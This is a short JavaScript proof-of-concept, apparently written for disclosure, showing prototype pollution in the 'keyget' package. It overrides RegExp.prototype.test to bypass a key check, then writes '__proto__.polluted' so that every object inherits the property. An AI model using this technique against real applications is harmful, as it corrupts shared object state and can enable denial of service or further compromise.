RegExp.prototype.test = () => true;
var keyget = require('keyget');
var obj = {};
console.log({}.polluted);
keyget.set({}, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');